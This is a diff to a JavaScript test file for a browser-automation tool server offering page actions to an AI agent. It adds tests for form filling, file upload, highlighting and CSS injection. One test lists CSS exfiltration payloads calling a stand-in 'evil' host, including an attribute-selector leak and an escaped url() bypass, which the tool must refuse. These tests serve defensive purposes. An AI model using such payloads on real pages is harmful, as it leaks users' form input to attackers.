@@ -13,7 +13,7 @@ const BrowserMcp = require("../browser-mcp.js");
 
 // A mock chrome that records calls and returns a configurable executeScript result.
 function mockChrome(opts = {}) {
-  const calls = { query: [], executeScript: [], tabsUpdate: [], captureVisibleTab: [], goBack: [], goForward: [], reload: [], tabsCreate: [], windowsUpdate: [] };
+  const calls = { query: [], executeScript: [], tabsUpdate: [], captureVisibleTab: [], goBack: [], goForward: [], reload: [], tabsCreate: [], windowsUpdate: [], insertCSS: [], removeCSS: [] };
   const chrome = {
     tabs: {
       query: async (q) => {
@@ -49,8 +49,12 @@ function mockChrome(opts = {}) {
         calls.executeScript.push(inj);
         // Simulate the in-page func's return (the func itself needs a DOM; not run here). frameId:0
         // is the top frame — the merge/all-frames path keys on it.
+        // opts.frameResults stands in for an allFrames run that answers from several frames.
+        if (opts.frameResults && inj.target.allFrames && inj.func) return opts.frameResults;
         return [{ frameId: 0, result: opts.scriptResult ?? { ok: true } }];
-      }
+      },
+      insertCSS: async (inj) => { calls.insertCSS.push(inj); },
+      removeCSS: async (inj) => { calls.removeCSS.push(inj); }
     },
   };
   return { chrome, calls };
@@ -133,7 +137,7 @@ test("notifications/initialized is a notification (no result)", async () => {
   assert.equal(res, undefined);
 });
 
-test("tools/list returns the 20 DOM-semantic browser tools", async () => {
+test("tools/list returns the 25 DOM-semantic browser tools", async () => {
   const { deps: d } = deps();
   const res = await BrowserMcp.handleMcpMessage("tools/list", {}, d);
   const names = res.tools.map((t) => t.name);
@@ -156,8 +160,13 @@ test("tools/list returns the 20 DOM-semantic browser tools", async () => {
     "katashiro.history",
     "katashiro.press_key",
     "katashiro.hover",
+    "katashiro.highlight",
+    "katashiro.get_selection",
     "katashiro.select_option",
-    "katashiro.reload"
+    "katashiro.fill_form",
+    "katashiro.upload_file",
+    "katashiro.reload",
+    "katashiro.inject_css"
   ]);
   // every tool carries a JSON-Schema inputSchema
   for (const t of res.tools) assert.equal(t.inputSchema.type, "object");
@@ -596,7 +605,9 @@ test("exactly the mutating tools are marked write", () => {
   assert.deepEqual(WRITE_TOOLS.sort(), [
     "katashiro.click",
     "katashiro.click_text",
+    "katashiro.fill_form",
     "katashiro.history",
+    "katashiro.inject_css",
     "katashiro.navigate",
     "katashiro.new_tab",
     "katashiro.press_key",
@@ -604,7 +615,8 @@ test("exactly the mutating tools are marked write", () => {
     "katashiro.select_option",
     "katashiro.switch_tab",
     "katashiro.type",
-    "katashiro.type_text"
+    "katashiro.type_text",
+    "katashiro.upload_file"
   ]);
 });
 
@@ -751,7 +763,7 @@ test("mcp/message tools/list: discovery round-trip with no inner params", async 
   // The shape the gateway deserializes into its own Tool type: drop any of these three
   // fields and discovery silently caches nothing.
   const tools = bag.sent[0].result.tools;
-  assert.equal(tools.length, 20);
+  assert.equal(tools.length, BrowserMcp.BROWSER_TOOLS.length);
   for (const t of tools) {
     assert.equal(typeof t.name, "string");
     assert.equal(typeof t.description, "string");
@@ -950,7 +962,7 @@ test("one server disconnecting leaves the other callable and still attached", as
   assert.equal(bag.state.connections["conn-n"], undefined);
 
   const k = await overTunnel(bag, 6, "conn-k", "tools/list", {});
-  assert.equal(k.result.tools.length, 20, "the surviving server still answers");
+  assert.equal(k.result.tools.length, BrowserMcp.BROWSER_TOOLS.length, "the surviving server still answers");
 });
 
 test("onStatus(false) only when the LAST tunnel closes", async () => {
@@ -1142,7 +1154,7 @@ test("click_text: refused (isError) when no Jev token is set", async () => {
   assert.match(res.content[0].text, /needs a Jev token/);
 });
 
-test("click_text: is advertised in the tool registry (18 tools total)", () => {
+test("click_text: is advertised in the tool registry", () => {
   assert.ok(BrowserMcp.TOOLS["katashiro.click_text"], "click_text is registered");
   assert.equal(BrowserMcp.TOOLS["katashiro.click_text"].write, true, "click_text is a write tool (act-gated)");
 });
@@ -1218,4 +1230,212 @@ test("extractRefCandidates ranks non-Chinese scripts too (\\p{L} coverage, e.g. 
   lines.push('- button "로그인 하기" [ref=e99]'); // Korean "log in", deep past the 60 cap
   const cands = BrowserMcp.extractRefCandidates(lines.join("\n"), "로그인", 60);
   assert.ok(cands["e99"], "Hangul target survives the cap (old zh-only regex would have dropped it)");
+});
+
+// --- click button / doubleClick ---------------------------------------------
+
+test("click passes the click mode to the page: single by default, right / double on request", async () => {
+  for (const [extra, mode, verb] of [[{}, "single", "clicked"], [{ button: "right" }, "right", "right-clicked"], [{ doubleClick: true }, "double", "double-clicked"]]) {
+    const { deps: d, calls } = deps({ scriptResult: { ok: true, how: "selector #m", tree: "- x" } });
+    const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.click", arguments: { selector: "#m", ...extra } }, d);
+    assert.equal(res.isError, undefined);
+    assert.match(res.content[0].text, new RegExp(`^${verb} selector #m`));
+    const act = calls.executeScript.find((c) => Array.isArray(c.args) && c.args[2] === "#m");
+    assert.equal(act.args[3], mode);
+  }
+});
+
+test("click refuses an unknown button and a right-button double-click", async () => {
+  for (const extra of [{ button: "middle" }, { button: "right", doubleClick: true }]) {
+    const { deps: d, calls } = deps();
+    const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.click", arguments: { selector: "#m", ...extra } }, d);
+    assert.equal(res.isError, true);
+    assert.equal(calls.executeScript.length, 0, "refused before touching the page");
+  }
+});
+
+// --- highlight ----------------------------------------------------------------
+
+test("highlight is read-only — runs with act mode off and returns no snapshot", async () => {
+  const { deps: d, calls } = deps({ actMode: false, scriptResult: { ok: true, how: "ref e5" } });
+  const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.highlight", arguments: { ref: "e5", snapshotId: 3, label: "this one" } }, d);
+  assert.equal(res.isError, undefined);
+  assert.match(res.content[0].text, /^highlighted ref e5 for 4000ms — "this one"/);
+  assert.doesNotMatch(res.content[0].text, /# snapshot/);
+  const act = calls.executeScript.find((c) => Array.isArray(c.args) && c.args[0] === "e5");
+  assert.deepEqual(act.args, ["e5", 3, null, "this one", 4000]);
+});
+
+test("highlight clamps the duration and refuses an over-long label", async () => {
+  const { deps: d, calls } = deps({ scriptResult: { ok: true, how: "selector #a" } });
+  await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.highlight", arguments: { selector: "#a", durationMs: 600000 } }, d);
+  assert.equal(calls.executeScript.find((c) => Array.isArray(c.args) && c.args[2] === "#a").args[4], 15000);
+
+  const long = deps();
+  const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.highlight", arguments: { selector: "#a", label: "x".repeat(81) } }, long.deps);
+  assert.equal(res.isError, true);
+  assert.match(res.content[0].text, /keep it to 80/);
+  assert.equal(long.calls.executeScript.length, 0);
+});
+
+test("highlight clear sweeps every frame; no target and no clear is an error", async () => {
+  const { deps: d, calls } = deps();
+  const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.highlight", arguments: { clear: true } }, d);
+  assert.match(res.content[0].text, /^cleared highlights/);
+  assert.equal(calls.executeScript[0].target.allFrames, true);
+
+  const bad = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.highlight", arguments: {} }, deps().deps);
+  assert.equal(bad.isError, true);
+});
+
+// --- get_selection --------------------------------------------------------------
+
+test("get_selection reports the selection with its container, labelling child frames", async () => {
+  const { deps: d, calls } = deps({
+    actMode: false,
+    frameResults: [
+      { frameId: 0, result: { text: "hello world", within: "p#intro", url: "https://t/" } },
+      { frameId: 5, result: { text: "" } },
+      { frameId: 7, result: { text: "in a frame", within: "td", url: "https://f/" } }
+    ]
+  });
+  const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.get_selection", arguments: {} }, d);
+  assert.equal(res.isError, undefined);
+  assert.equal(calls.executeScript[0].target.allFrames, true);
+  assert.match(res.content[0].text, /^selection in p#intro:\nhello world/);
+  assert.match(res.content[0].text, /selection in td \[frame f7: https:\/\/f\/\]:\nin a frame/);
+  assert.doesNotMatch(res.content[0].text, /f5/);
+});
+
+test("get_selection with nothing selected says so (not an error)", async () => {
+  const { deps: d } = deps({ frameResults: [{ frameId: 0, result: { text: "" } }] });
+  const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.get_selection", arguments: {} }, d);
+  assert.equal(res.isError, undefined);
+  assert.match(res.content[0].text, /nothing is selected/);
+});
+
+// --- fill_form ------------------------------------------------------------------
+
+test("fill_form validates every field before filling any (two passes per frame)", async () => {
+  const { deps: d, calls } = deps({ scriptResult: { ok: true, tree: "- x" } });
+  const res = await BrowserMcp.handleMcpMessage("tools/call", {
+    name: "katashiro.fill_form",
+    arguments: { snapshotId: 9, fields: [{ ref: "e1", value: "Ada" }, { ref: "f3:e2", checked: true }, { selector: "#c", value: "TW" }] }
+  }, d);
+  assert.equal(res.isError, undefined);
+  assert.match(res.content[0].text, /^filled 3 fields: e1, f3:e2, #c/);
+  const acts = calls.executeScript.filter((c) => Array.isArray(c.args) && Array.isArray(c.args[0]));
+  // frame 0 (e1 + #c) and frame 3 (e2): validate both, then apply both.
+  assert.deepEqual(acts.map((c) => [c.target.frameIds[0], c.args[2]]), [[0, false], [3, false], [0, true], [3, true]]);
+  assert.deepEqual(acts[1].args[0], [{ i: 1, ref: "e2", label: "f3:e2", selector: null, value: null, checked: true }]);
+  assert.equal(acts[0].args[1], 9);
+});
+
+test("fill_form fills nothing when the check pass fails", async () => {
+  const { deps: d, calls } = deps({ scriptResult: { ok: false, error: "field 0 (#x) is disabled or read-only" } });
+  const res = await BrowserMcp.handleMcpMessage("tools/call", {
+    name: "katashiro.fill_form", arguments: { fields: [{ selector: "#x", value: "a" }] }
+  }, d);
+  assert.equal(res.isError, true);
+  assert.match(res.content[0].text, /nothing was filled/);
+  assert.ok(!calls.executeScript.some((c) => Array.isArray(c.args) && c.args[2] === true), "no apply pass ran");
+});
+
+test("fill_form argument checks: empty, missing target, missing value, ref without snapshotId", async () => {
+  for (const [args, re] of [
+    [{ fields: [] }, /non-empty/],
+    [{ fields: [{ value: "a" }] }, /field 0 needs a ref/],
+    [{ fields: [{ selector: "#a" }] }, /field 0 needs a `value`/],
+    [{ fields: [{ ref: "e1", value: "a" }] }, /snapshotId/],
+    [{ fields: Array.from({ length: 51 }, () => ({ selector: "#a", value: "a" })) }, /at most 50/]
+  ]) {
+    const { deps: d, calls } = deps();
+    const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.fill_form", arguments: args }, d);
+    assert.equal(res.isError, true);
+    assert.match(res.content[0].text, re);
+    assert.equal(calls.executeScript.length, 0);
+  }
+});
+
+// --- upload_file ----------------------------------------------------------------
+
+test("upload_file sends normalized files to the page and reports the byte total", async () => {
+  const { deps: d, calls } = deps({ scriptResult: { ok: true, how: "selector #f", tree: "- x" } });
+  const res = await BrowserMcp.handleMcpMessage("tools/call", {
+    name: "katashiro.upload_file",
+    arguments: { selector: "#f", files: [{ name: "a.txt", text: "héllo" }, { name: "b.png", mimeType: "image/png", base64: "QUJD\nRA==" }] }
+  }, d);
+  assert.equal(res.isError, undefined);
+  assert.match(res.content[0].text, /^attached a\.txt, b\.png \(10 bytes\) to selector #f/); // 6 UTF-8 + 4 decoded
+  const act = calls.executeScript.find((c) => Array.isArray(c.args) && c.args[2] === "#f");
+  assert.deepEqual(act.args[3], [
+    { name: "a.txt", type: "application/octet-stream", text: "héllo", base64: null },
+    { name: "b.png", type: "image/png", text: null, base64: "QUJDRA==" }
+  ]);
+});
+
+test("upload_file argument checks run before the page is touched", async () => {
+  const big = "A".repeat(Math.ceil((5 * 1024 * 1024 + 3) / 3) * 4);
+  for (const [args, re] of [
+    [{ files: [{ name: "a", text: "x" }] }, /needs a ref/],
+    [{ selector: "#f", files: [] }, /non-empty/],
+    [{ selector: "#f", files: [{ text: "x" }] }, /needs a `name`/],
+    [{ selector: "#f", files: [{ name: "a" }] }, /exactly one of/],
+    [{ selector: "#f", files: [{ name: "a", text: "x", base64: "QQ==" }] }, /exactly one of/],
+    [{ selector: "#f", files: [{ name: "a", base64: "not base64!" }] }, /not valid base64/],
+    [{ selector: "#f", files: [{ name: "a", base64: big }] }, /capped at/]
+  ]) {
+    const { deps: d, calls } = deps();
+    const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.upload_file", arguments: args }, d);
+    assert.equal(res.isError, true, JSON.stringify(args).slice(0, 80));
+    assert.match(res.content[0].text, re);
+    assert.equal(calls.executeScript.length, 0);
+  }
+});
+
+// --- inject_css -----------------------------------------------------------------
+
+test("inject_css inserts into every frame, and clear removes exactly what it inserted", async () => {
+  const { deps: d, calls } = deps();
+  const css = ".banner { display: none !important; }";
+  const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.inject_css", arguments: { css } }, d);
+  assert.equal(res.isError, undefined);
+  assert.deepEqual(calls.insertCSS, [{ target: { tabId: 42, allFrames: true }, css }]);
+
+  const cleared = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.inject_css", arguments: { clear: true } }, d);
+  assert.match(cleared.content[0].text, /^removed 1 injected stylesheet/);
+  assert.deepEqual(calls.removeCSS, [{ target: { tabId: 42, allFrames: true }, css }]);
+
+  const again = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.inject_css", arguments: { clear: true } }, d);
+  assert.match(again.content[0].text, /^removed 0 injected stylesheets/);
+});
+
+test("inject_css refuses stylesheets that can fetch, and CSS escapes", async () => {
+  for (const css of [
+    "input[value^=a] { background: url(https://evil/a) }",
+    "a { background: URL ( //x ) }",
+    "@import 'https://evil/x.css';",
+    "a { background: image-set('x.png' 1x) }",
+    "@font-face { font-family: x; src: local(Arial) }",
+    "a { background: u\\72l(https://evil/) }"
+  ]) {
+    const { deps: d, calls } = deps();
+    const res = await BrowserMcp.handleMcpMessage("tools/call", { name: "katashiro.inject_css", arguments: { css } }, d);
+    assert.equal(res.isError, true, css);
+    assert.match(res.content[0].text, /refuses anything that fetches/);
+    assert.equal(calls.insertCSS.length, 0);
+  }
+});
+
+test("the new write tools are refused with act mode off without touching the page", async () => {
+  for (const [name, args] of [
+    ["katashiro.fill_form", { fields: [{ selector: "#a", value: "x" }] }],
+    ["katashiro.upload_file", { selector: "#f", files: [{ name: "a", text: "x" }] }],
+    ["katashiro.inject_css", { css: "a{color:red}" }]
+  ]) {
+    const { deps: d, calls } = deps({ actMode: false });
+    const res = await BrowserMcp.handleMcpMessage("tools/call", { name, arguments: args }, d);
+    assert.match(res.content[0].text, /act mode is off/);
+    assert.equal(calls.executeScript.length + calls.insertCSS.length, 0, name);
+  }
 });
